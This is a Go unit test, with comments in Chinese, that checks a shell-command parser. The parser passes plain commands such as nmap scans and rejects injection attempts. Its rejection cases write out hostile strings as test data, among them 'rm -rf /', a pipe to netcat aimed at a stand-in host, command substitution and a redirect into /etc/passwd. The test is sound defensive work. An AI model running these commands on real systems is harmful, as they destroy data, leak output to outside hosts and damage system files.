package security

import "testing"

func TestShellSafeParse(t *testing.T) {
	cases := []struct {
		name     string
		cmd      string
		wantErr  bool
		wantArgs []string // 期望（仅 wantErr=false 时校验）
	}{
		// 正常命令应通过
		{"normal nmap", "nmap -sV 10.0.0.1", false, []string{"nmap", "-sV", "10.0.0.1"}},
		{"multiple spaces", "nmap   -sV   10.0.0.1", false, []string{"nmap", "-sV", "10.0.0.1"}},
		{"double quoted arg", `echo "a|b"`, false, []string{"echo", "a|b"}},
		{"single quoted pipe", `'it;s ok'`, false, []string{"it;s ok"}},
		{"escaped quote in double", `"a\"b"`, false, []string{`a"b`}},
		{"env var allowed", `nmap $TARGET`, false, []string{"nmap", "$TARGET"}},
		{"env var brace allowed", `nmap ${TARGET}`, false, []string{"nmap", "${TARGET}"}},
		{"trailing space", "nmap ", false, []string{"nmap"}},

		// 注入必须被拒
		{"semicolon injection", `nmap ; rm -rf /`, true, nil},
		{"pipe injection", `nmap | nc evil 53`, true, nil},
		{"dollar paren", `nmap $(whoami)`, true, nil},
		{"backtick", "nmap `id`", true, nil},
		{"ampersand background", `nmap & background`, true, nil},
		{"redirect out", `nmap > /etc/passwd`, true, nil},
		{"redirect in", `nmap < input`, true, nil},
		{"newline injection", "nmap\nrm -rf /", true, nil},
		{"crlf injection", "nmap\r\nrm", true, nil},
		{"pipe in double quote ok", `echo "a|b"`, false, nil}, // 引号内允许
		{"pipe outside quote reject", `echo "a" | b`, true, nil},
		{"unterminated single", `'unterminated`, true, nil},
		{"unterminated double", `"unterminated`, true, nil},
		{"empty command", "", true, nil},
		{"only spaces", "   ", true, nil},
		{"leading pipe", `| evil`, true, nil},
		{"double dollar paren", `nmap $( $(id) )`, true, nil},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			args, err := ShellSafeParse(tc.cmd)
			if tc.wantErr {
				if err == nil {
					t.Fatalf("期望拒绝，实际通过 args=%v", args)
				}
				return
			}
			if err != nil {
				t.Fatalf("期望通过，实际拒绝: %v (cmd=%q)", err, tc.cmd)
			}
			if tc.wantArgs != nil {
				if len(args) != len(tc.wantArgs) {
					t.Fatalf("argv 数不符: got %v want %v", args, tc.wantArgs)
				}
				for i := range args {
					if args[i] != tc.wantArgs[i] {
						t.Fatalf("argv[%d] 不符: got %q want %q", i, args[i], tc.wantArgs[i])
					}
				}
			}
		})
	}
}
